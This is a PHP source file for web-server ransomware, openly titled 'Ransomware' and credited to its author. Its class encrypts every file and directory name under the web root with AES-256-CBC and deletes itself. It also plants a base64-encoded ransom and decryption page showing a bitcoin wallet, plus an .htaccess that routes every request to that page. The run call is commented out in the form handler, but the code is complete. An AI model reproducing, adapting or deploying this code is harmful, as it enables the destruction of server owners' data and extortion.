<?php
@error_reporting(0);
@set_time_limit(0);
@umask(0);
class Ransomware {
    private $root = null;
    private $salt = null;
    private $recovery = null;
    private $cryptoKey = null;
    private $cryptoKeyLength = '32';
    private $iterations = '10000';
    private $algorithm = 'SHA512';
    private $iv = null;
    private $cipher = 'AES-256-CBC';
    private $extension = 'ransom';
    public function __construct($key) {
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->salt = openssl_random_pseudo_bytes(10);
        $this->recovery = base64_encode($key);
        $this->cryptoKey = @openssl_pbkdf2($key, $this->salt, $this->cryptoKeyLength, $this->iterations, $this->algorithm);
        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));
    }
    private function generateRandomFileName($directory, $extension) {
        $randomName = '';
        do {
            $randomName = str_replace(array('+', '/', '='), '', base64_encode(openssl_random_pseudo_bytes(6)));
            $randomName = $randomName ? $directory . '/' . $randomName . '.' . $extension : false;
        } while ($randomName !== false && file_exists($randomName));
        return $randomName;
    }
    private function createDecryptionFile($directory) {
        // decryption file encoded in Base64
        $data = base64_decode('PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpAc2V0X3RpbWVfbGltaXQoMCk7DQpAdW1hc2soMCk7DQpjbGFzcyBSYW5zb213YXJlIHsNCiAgICBwcml2YXRlICRyb290ID0gJzxyb290Lz4nOw0KICAgIHByaXZhdGUgJHNhbHQgPSBudWxsOw0KICAgIHByaXZhdGUgJGNyeXB0b0tleSA9IG51bGw7DQogICAgcHJpdmF0ZSAkY3J5cHRvS2V5TGVuZ3RoID0gJzxjcnlwdG9LZXlMZW5ndGgvPic7' .  'DQogICAgcHJpdmF0ZSAkaXRlcmF0aW9ucyA9ICc8aXRlcmF0aW9ucy8+JzsNCiAgICBwcml2YXRlICRhbGdvcml0aG0gPSAnPGFsZ29yaXRobS8+JzsNCiAgICBwcml2YXRlICRpdiA9IG51bGw7DQogICAgcHJpdmF0ZSAkY2lwaGVyID0gJzxjaXBoZXIvPic7DQogICAgcHJpdmF0ZSAkZXh0ZW5zaW9uID0gJzxleHRlbnNpb24vPic7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRr' .  'ZXkpIHsNCiAgICAgICAgJHRoaXMtPnNhbHQgPSBiYXNlNjRfZGVjb2RlKCc8c2FsdC8+Jyk7DQogICAgICAgICR0aGlzLT5jcnlwdG9LZXkgPSBAb3BlbnNzbF9wYmtkZjIoJGtleSwgJHRoaXMtPnNhbHQsICR0aGlzLT5jcnlwdG9LZXlMZW5ndGgsICR0aGlzLT5pdGVyYXRpb25zLCAkdGhpcy0+YWxnb3JpdGhtKTsNCiAgICAgICAgJHRoaXMtPml2ID0gYmFzZTY0X2RlY29kZSgnPGl2Lz4nKTsN' .  'CiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkZWxldGVEZWNyeXB0aW9uRmlsZSgkZGlyZWN0b3J5KSB7DQogICAgICAgIHVubGluaygkZGlyZWN0b3J5IC4gJy8uaHRhY2Nlc3MnKTsNCiAgICAgICAgdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGVjcnlwdE5hbWUoJHBhdGgpIHsNCiAgICAgICAgJGRlY3J5cHRlZE5h' .  'bWUgPSBAb3BlbnNzbF9kZWNyeXB0KHVybGRlY29kZShwYXRoaW5mbygkcGF0aCwgUEFUSElORk9fRklMRU5BTUUpKSwgJHRoaXMtPmNpcGhlciwgJHRoaXMtPmNyeXB0b0tleSwgMCwgJHRoaXMtPml2KTsNCiAgICAgICAgJGRlY3J5cHRlZE5hbWUgPSAkZGVjcnlwdGVkTmFtZSA/IHN1YnN0cigkcGF0aCwgMCwgc3Rycmlwb3MoJHBhdGgsICcvJykgKyAxKSAuICRkZWNyeXB0ZWROYW1lIDogZmFs' .  'c2U7DQogICAgICAgIHJldHVybiAkZGVjcnlwdGVkTmFtZTsNCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkZWNyeXB0RGlyZWN0b3J5KCRlbmNyeXB0ZWREaXJlY3RvcnkpIHsNCiAgICAgICAgaWYgKHBhdGhpbmZvKCRlbmNyeXB0ZWREaXJlY3RvcnksIFBBVEhJTkZPX0VYVEVOU0lPTikgPT09ICR0aGlzLT5leHRlbnNpb24pIHsNCiAgICAgICAgICAgICRkaXJlY3RvcnkgPSAkdGhpcy0+' .  'ZGVjcnlwdE5hbWUoJGVuY3J5cHRlZERpcmVjdG9yeSk7DQogICAgICAgICAgICBpZiAoJGRpcmVjdG9yeSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICByZW5hbWUoJGVuY3J5cHRlZERpcmVjdG9yeSwgJGRpcmVjdG9yeSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkZWNyeXB0RmlsZSgkZW5jcnlwdGVkRmlsZSkgew0KICAgICAg' .  'ICBpZiAocGF0aGluZm8oJGVuY3J5cHRlZEZpbGUsIFBBVEhJTkZPX0VYVEVOU0lPTikgPT09ICR0aGlzLT5leHRlbnNpb24pIHsNCiAgICAgICAgICAgICRkYXRhID0gQG9wZW5zc2xfZGVjcnlwdChmaWxlX2dldF9jb250ZW50cygkZW5jcnlwdGVkRmlsZSksICR0aGlzLT5jaXBoZXIsICR0aGlzLT5jcnlwdG9LZXksIDAsICR0aGlzLT5pdik7DQogICAgICAgICAgICBpZiAoJGRhdGEgIT09IGZh' .  'bHNlKSB7DQogICAgICAgICAgICAgICAgJGZpbGUgPSAkdGhpcy0+ZGVjcnlwdE5hbWUoJGVuY3J5cHRlZEZpbGUpOw0KICAgICAgICAgICAgICAgIGlmICgkZmlsZSAhPT0gZmFsc2UgJiYgcmVuYW1lKCRlbmNyeXB0ZWRGaWxlLCAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGRhdGEsIExPQ0tfRVgpKSB7DQogICAgICAgICAgICAg' .  'ICAgICAgICAgICByZW5hbWUoJGZpbGUsICRlbmNyeXB0ZWRGaWxlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIHNjYW4oJGRpcmVjdG9yeSkgew0KICAgICAgICAkZmlsZXMgPSBAYXJyYXlfZGlmZihzY2FuZGlyKCRkaXJlY3RvcnkpLCBhcnJheSgnLicsICcuLicp' .  'KTsNCiAgICAgICAgaWYgKCRmaWxlcyAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgew0KICAgICAgICAgICAgICAgICRwYXRoID0gJGRpcmVjdG9yeSAuICcvJyAuICRmaWxlOw0KICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJHBhdGgpKSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zY2FuKCRwYXRoKTsNCiAgICAgICAgICAgICAgICAg' .  'ICAgJHRoaXMtPmRlY3J5cHREaXJlY3RvcnkoJHBhdGgpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5kZWNyeXB0RmlsZSgkcGF0aCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBydW4oKSB7DQogICAgICAgIC8vICR0aGlzLT5kZWxldGVEZWNyeXB0aW9u' .  'RmlsZSgkdGhpcy0+cm9vdCk7DQogICAgICAgIGlmICgkdGhpcy0+Y3J5cHRvS2V5ICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgJHRoaXMtPnNjYW4oJHRoaXMtPnJvb3QpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KJGVycm9yTWVzc2FnZSA9ICcnOw0KaWYgKGlzc2V0KCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSAmJiBzdHJ0b2xvd2VyKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSA9' .  'PT0gJ3Bvc3QnICYmIGlzc2V0KCRfUE9TVFsna2V5J10pKSB7DQogICAgbWJfaW50ZXJuYWxfZW5jb2RpbmcoJ1VURi04Jyk7DQogICAgaWYgKG1iX3N0cmxlbigkX1BPU1RbJ2tleSddKSA8IDEpIHsNCiAgICAgICAgJGVycm9yTWVzc2FnZSA9ICdQbGVhc2UgZW50ZXIgZGVjcnlwdGlvbiBrZXknOw0KICAgIH0gZWxzZSBpZiAoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkgew0KICAgICAg' .  'ICAkZXJyb3JNZXNzYWdlID0gJ09wZW5TU0wgbm90IGVuYWJsZWQnOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRyYW5zb213YXJlID0gbmV3IFJhbnNvbXdhcmUoJF9QT1NUWydrZXknXSk7DQogICAgICAgICRyYW5zb213YXJlLT5ydW4oKTsNCiAgICAgICAgdW5zZXQoJF9QT1NUWydrZXknXSwgJHJhbnNvbXdhcmUpOw0KICAgICAgICBAZ2NfY29sbGVjdF9jeWNsZXMoKTsNCiAgICAgICAgaGVh' .  'ZGVyKCdMb2NhdGlvbjogLycpOw0KICAgICAgICBleGl0KCk7DQogICAgfQ0KfQ0KPz4NCjwhRE9DVFlQRSBodG1sPg0KPGh0bWwgbGFuZz0iZW4iPg0KCTxoZWFkPg0KCQk8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQoJCTx0aXRsZT5SYW5zb213YXJlPC90aXRsZT4NCgkJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlJhbnNvbXdhcmUgd3JpdHRlbiBpbiBQSFAuIj4NCgkJPG1ldGEg' .  'bmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IkhUTUwsIENTUywgUEhQLCByYW5zb213YXJlIj4NCgkJPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJJdmFuIMWgaW5jZWsiPg0KCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQoJCTxzdHlsZT4NCgkJCWh0bWwgew0KCQkJCWhlaWdodDogMTAwJTsNCgkJCX0NCgkJ' .  'CWJvZHkgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICMyNjI2MjY7DQoJCQkJZGlzcGxheTogZmxleDsNCgkJCQlmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KCQkJCW1hcmdpbjogMDsNCgkJCQloZWlnaHQ6IGluaGVyaXQ7DQoJCQkJY29sb3I6ICNGOEY4Rjg7DQoJCQkJZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7DQoJCQkJZm9udC1zaXplOiAxZW07DQoJCQkJZm9u' .  'dC13ZWlnaHQ6IDQwMDsNCgkJCQl0ZXh0LWFsaWduOiBsZWZ0Ow0KCQkJfQ0KCQkJLmZyb250LWZvcm0gew0KCQkJCWRpc3BsYXk6IGZsZXg7DQoJCQkJZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCgkJCQlhbGlnbi1pdGVtczogY2VudGVyOw0KCQkJCWp1c3RpZnktY29udGVudDogY2VudGVyOw0KCQkJCWZsZXg6IDEgMCBhdXRvOw0KCQkJCXBhZGRpbmc6IDAuNWVtOw0KCQkJfQ0KCQkJLmZyb250' .  'LWZvcm0gLmxheW91dCB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogI0RDRENEQzsNCgkJCQlwYWRkaW5nOiAxLjVlbTsNCgkJCQl3aWR0aDogMjFlbTsNCgkJCQljb2xvcjogIzAwMDsNCgkJCQlib3JkZXI6IDAuMDdlbSBzb2xpZCAjMDAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBoZWFkZXIgew0KCQkJCXRleHQtYWxpZ246IGNlbnRlcjsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5s' .  'YXlvdXQgaGVhZGVyIC50aXRsZSB7DQoJCQkJbWFyZ2luOiAwOw0KCQkJCWZvbnQtc2l6ZTogMi42ZW07DQoJCQkJZm9udC13ZWlnaHQ6IDQwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFib3V0IHsNCgkJCQl0ZXh0LWFsaWduOiBjZW50ZXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dCBwIHsNCgkJCQltYXJnaW46IDFlbSAwOw0KCQkJCWNvbG9yOiAjMkY0' .  'RjRGOw0KCQkJCWZvbnQtd2VpZ2h0OiA2MDA7DQoJCQkJd29yZC13cmFwOiBicmVhay13b3JkOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgaW1nIHsNCgkJCQlib3JkZXI6IDAuMDdlbSBzb2xpZCAjMDAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIHsNCgkJCQlkaXNwbGF5OiBmbGV4Ow0KCQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJbWFy' .  'Z2luLXRvcDogMWVtOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGlucHV0IHsNCgkJCQktd2Via2l0LWFwcGVhcmFuY2U6IG5vbmU7DQoJCQkJLW1vei1hcHBlYXJhbmNlOiBub25lOw0KCQkJCWFwcGVhcmFuY2U6IG5vbmU7DQoJCQkJbWFyZ2luOiAwOw0KCQkJCXBhZGRpbmc6IDAuMmVtIDAuNGVtOw0KCQkJCWZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNl' .  'cmlmOw0KCQkJCWZvbnQtc2l6ZTogMWVtOw0KCQkJCWJvcmRlcjogMC4wN2VtIHNvbGlkICM5RDJBMDA7DQoJCQkJLXdlYmtpdC1ib3JkZXItcmFkaXVzOiAwOw0KCQkJCS1tb3otYm9yZGVyLXJhZGl1czogMDsNCgkJCQlib3JkZXItcmFkaXVzOiAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGlucHV0W3R5cGU9InN1Ym1pdCJdIHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAj' .  'RkY0NTAwOw0KCQkJCWNvbG9yOiAjRjhGOEY4Ow0KCQkJCWN1cnNvcjogcG9pbnRlcjsNCgkJCQl0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDIyMG1zIGxpbmVhcjsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSBpbnB1dFt0eXBlPSJzdWJtaXQiXTpob3ZlciB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogI0Q4M0EwMDsNCgkJCQl0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNv' .  'bG9yIDIyMG1zIGxpbmVhcjsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSAuZXJyb3Igew0KCQkJCW1hcmdpbjogMCAwIDFlbSAwOw0KCQkJCWNvbG9yOiAjOUQyQTAwOw0KCQkJCWZvbnQtc2l6ZTogMC44ZW07DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gLmVycm9yOm5vdCg6ZW1wdHkpIHsNCgkJCQltYXJnaW46IDAuMmVtIDAgMWVtIDA7DQoJCQl9DQoJCQku' .  'ZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gbGFiZWwgew0KCQkJCW1hcmdpbi1ib3R0b206IDAuMmVtOw0KCQkJCWhlaWdodDogMS4yZW07DQoJCQl9DQoJCQlAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOiA0ODBweCkgew0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgew0KCQkJCQl3aWR0aDogMTUuNWVtOw0KCQkJCX0NCgkJCX0NCgkJCUBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDMy' .  'MHB4KSB7DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCB7DQoJCQkJCXdpZHRoOiAxNC41ZW07DQoJCQkJfQ0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgaGVhZGVyIC50aXRsZSB7DQoJCQkJCWZvbnQtc2l6ZTogMi40ZW07DQoJCQkJfQ0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFib3V0IHAgew0KCQkJCQlmb250LXNpemU6IDAuOWVtOw0KCQkJCX0NCgkJCX0NCgkJPC9zdHlsZT4NCgk8L2hl' .  'YWQ+DQoJPGJvZHk+DQoJCTxkaXYgY2xhc3M9ImZyb250LWZvcm0iPg0KCQkJPGRpdiBjbGFzcz0ibGF5b3V0Ij4NCgkJCQk8aGVhZGVyPg0KCQkJCQk8aDEgY2xhc3M9InRpdGxlIj5SYW5zb213YXJlPC9oMT4NCgkJCQk8L2hlYWRlcj4NCgkJCQk8ZGl2IGNsYXNzPSJhYm91dCI+DQoJCQkJCTxwPk1hZGUgYnkgSXZhbiDFoGluY2VrLjwvcD4NCgkJCQkJPHA+SSBob3BlIHlvdSBsaWtlIGl0ITwv' .  'cD4NCgkJCQkJPHA+RmVlbCBmcmVlIHRvIGRvbmF0ZSBiaXRjb2luLjwvcD4NCgkJCQkJPGltZyBzcmM9ImRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBSllBQUFDV0NBSUFBQUN6WSthMUFBQUFCbUpMUjBRQS93RC9BUCtndmFlVEFBQURZa2xFUVZSNG5PMmR5MjdqTUF3QW5VWC8vNWZUd3hZNUNJNGdoYVRrY1dZdUMyejhhZ2RFV0lta0g4L244eEF5LzNZL2dF' .  'VDUrZi9QNC9GWWM3K3BvRytlcWpsMzJhZDlJdWRHZU4zWEtNU2pRandxeEtOQ1BEK24vNXY0bDBiLzY3MmZWdlNweTR3aU4wbzh0K0hkUXhxRmVGU0lSNFY0VklqblBKMXBpS3hXUkE3dWY5clBVQ0tQMFZ3NU1kbXArRTBhaFhoVWlFZUZlRlNJWnlpZHFTUHg2MzBxNlloa0tNdTJrd1l4Q3ZHb0VJOEs4YWdReitaMFpxcWtwWDl1QTZMK0pRV2pFSThLOGFnUWp3cnhES1V6ZFVYN1U0bkQxSkpLWW9h' .  'UytPTlgvQ2FOUWp3cXhLTkNQQ3JFYzU3TzdGcWVTT3cvU3V4ZG1ycHkvK0FLakVJOEtzU2pRandxeFBPNDFMaUV1bEtheUs3V3hURUs4YWdRandyeHFCQlAvdHladWwyZXhPV1lYV05vRWo5OVlSVGlVU0VlRmVKUklaNmgxWmxsbmNxN0J1VkYrcDdxSnRvTW5tc1U0bEVoSGhYaVVTR2VUMHFCcDFaSjZsaFdTalBWWUpWWVdlUGNtVzlCaFhoVWlFZUZlSVkybXhJbjR5MnJqcG02YitJWXZjUVJ3bTQy' .  'ZlFzcXhLTkNQQ3JFODVmTzFEWCtKSjZidUt1MWE4OHJjcU4zR0lWNFZJaEhoWGhVaU9ldmRtWkJpY2ZJd1ZQMzNmVVlkUzNnbjkzWEtNU2pRandxeEtOQ1BPZnB6TEl2OEdYRDdxN1p0MjN0akJ5SENtK0FDdkdvRUUvNUdMMjZ1cHZJbWxIZERsSGl3WU1ZaFhoVWlFZUZlRlNJWjZoMkpySmFVYmNIMUw5UlpLT3FMcXVxcUpNMkN2R29FSThLOGFnUXozbG5FMklQYU5mc3V3Z1ZWellLOGFnUWp3cnhx' .  'QkJQUXUxTWU4V0MvWlE0ZFQ5ZzR0S1ZtMDFmaWdyeHFCQ1BDdkVNamRGcm1Qb1N2c2c0M3NSUDYzSzlxWVBkYkxvUEtzU2pRandxeEpNL0ZiaGhXZFBRc3IybnFjZEl2SkZqOUc2TEN2R29FSThLOFd4K28zWmQvM1RpL3RHeTRYNVR1RHB6SDFTSVI0VjRWSWduLzQzYWZSSzdxeE92dkt2QnlxbkFjaHdxdkFFcXhLTkNQT2ViVFhXOVBQMGJKYzRNM2pYcnIrNmRUZThPTmdyeHFCQ1BDdkdvRU05UTdj' .  'eXlOeE1rMXRFMjFEVXI3WHEvMVF1akVJOEs4YWdRandyeGZOTFpWRWVrcGFnaGNVbGwyVnZBUDh0dWpFSThLc1NqUWp3cXhIT3RkS1loa3QwczJ4SnFxS3RDc3JQcHRxZ1Fqd3J4cUJEUEo0M2F5NmlyN28wVTdQWlozeUJ1Rk9KUklSNFY0bEVobnZKWFVDNWoxN0NZL3FVV0xDRVpoWGhVaUVlRmVGU0laL1BjR1lsakZPSlJJWjVmZWd0VFVBWHBWaFVBQUFBQVNVVk9SSzVDWUlJPSIgYWx0PSJCaXRj' .  'b2luIFdhbGxldCI+DQoJCQkJCTxwPjFCclpNNlQ3RzlSTjh2YmFibmZYdTRNNkxwZ3p0cTZZMTQ8L3A+DQoJCQkJPC9kaXY+DQoJCQkJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw/cGhwIGVjaG8gJy4vJyAuIHBhdGhpbmZvKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSwgUEFUSElORk9fQkFTRU5BTUUpOyA/PiI+DQoJCQkJCTxsYWJlbCBmb3I9ImtleSI+RGVjcnlwdGlvbiBLZXk8' .  'L2xhYmVsPg0KCQkJCQk8aW5wdXQgbmFtZT0ia2V5IiBpZD0ia2V5IiB0eXBlPSJ0ZXh0IiBzcGVsbGNoZWNrPSJmYWxzZSIgYXV0b2ZvY3VzPSJhdXRvZm9jdXMiPg0KCQkJCQk8cCBjbGFzcz0iZXJyb3IiPjw/cGhwIGVjaG8gJGVycm9yTWVzc2FnZTsgPz48L3A+DQoJCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJEZWNyeXB0Ij4NCgkJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgdmFs' .  'dWU9IjxyZWNvdmVyeS8+IiBwbGFjZWhvbGRlcj0iYjY0LXJlY292ZXJ5Ij4NCgkJCQk8L2Zvcm0+DQoJCQk8L2Rpdj4NCgkJPC9kaXY+DQoJPC9ib2R5Pg0KPC9odG1sPg0K');
        $data = str_replace(
            array(
                '<root/>',
                '<salt/>',
                '<recovery/>',
                '<cryptoKeyLength/>',
                '<iterations/>',
                '<algorithm/>',
                '<iv/>',
                '<cipher/>',
                '<extension/>'
            ),
            array(
                $this->root,
                base64_encode($this->salt),
                $this->recovery,
                $this->cryptoKeyLength,
                $this->iterations,
                $this->algorithm,
                base64_encode($this->iv),
                $this->cipher,
                $this->extension
            ),
            $data
        );
        $decryptionFile = $this->generateRandomFileName($directory, 'php');
        if ($decryptionFile === false) {
            $decryptionFile = "{$directory}/decrypt.php";
        }
        if (file_put_contents($decryptionFile, $data, LOCK_EX)) {
            $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);
            file_put_contents($directory . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 400 /{$decryptionFile}\nErrorDocument 401 /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\nErrorDocument 500 /{$decryptionFile}\n", LOCK_EX);
        }
    }
    private function encryptName($path) {
        $encryptedName = '';
        do {
            $encryptedName = @openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv);
            $encryptedName = $encryptedName ? substr($path, 0, strripos($path, '/') + 1) . urlencode($encryptedName) . '.' . $this->extension : false;
        } while ($encryptedName !== false && file_exists($encryptedName));
        return $encryptedName;
    }
    private function encryptDirectory($directory) {
        $encryptedDirectory = $this->encryptName($directory);
        if ($encryptedDirectory !== false) {
            rename($directory, $encryptedDirectory);
        }
    }
    private function encryptFile($file) {
        $encryptedData = @openssl_encrypt(file_get_contents($file), $this->cipher, $this->cryptoKey, 0, $this->iv);
        if ($encryptedData !== false) {
            $encryptedFile = $this->encryptName($file);
            if ($encryptedFile !== false && rename($file, $encryptedFile)) {
                if (!file_put_contents($encryptedFile, $encryptedData, LOCK_EX)) {
                    rename($encryptedFile, $file);
                }
            }
        }
    }
    private function scan($directory) {
        $files = @array_diff(scandir($directory), array('.', '..'));
        if ($files !== false) {
            foreach ($files as $file) {
                $path = $directory . '/' . $file;
                if (is_dir($path)) {
                    $this->scan($path);
                    $this->encryptDirectory($path);
                } else {
                    $this->encryptFile($path);
                }
            }
        }
    }
    public function run() {
        unlink($_SERVER['SCRIPT_FILENAME']);
        if ($this->cryptoKey !== false) {
            $this->scan($this->root);
            $this->createDecryptionFile($this->root);
        }
    }
}
$errorMessage = '';
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post' && isset($_POST['key'])) {
    mb_internal_encoding('UTF-8');
    if (mb_strlen($_POST['key']) < 1) {
        $errorMessage = 'Please enter encryption key';
    } else if (!extension_loaded('openssl')) {
        $errorMessage = 'OpenSSL not enabled';
    } else {
        $ransomware = new Ransomware($_POST['key']);
        // $ransomware->run();
        unset($_POST['key'], $ransomware);
        @gc_collect_cycles();
        header('Location: /');
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="description" content="Ransomware written in PHP.">
		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #DCDCDC;
				padding: 1.5em;
				width: 21em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				margin: 0;
				font-size: 2.6em;
				font-weight: 400;
			}
			.front-form .layout header p {
				margin: 0;
				font-size: 1.2em;
			}
			.front-form .layout .advice p {
				margin: 1em 0 0 0;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #FF4500;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #D83A00;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					font-size: 2.4em;
				}
				.front-form .layout header p {
					font-size: 1.1em;
				}
				.front-form .layout .advice p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware</h1>
					<p>Made by Ivan Šincek</p>
				</header>
				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<label for="key">Encryption Key</label>
					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
					<p class="error"><?php echo $errorMessage; ?></p>
					<input type="submit" value="Encrypt">
				</form>
				<div class="advice">
					<p>Backup your server files!</p>
				</div>
			</div>
		</div>
	</body>
</html>
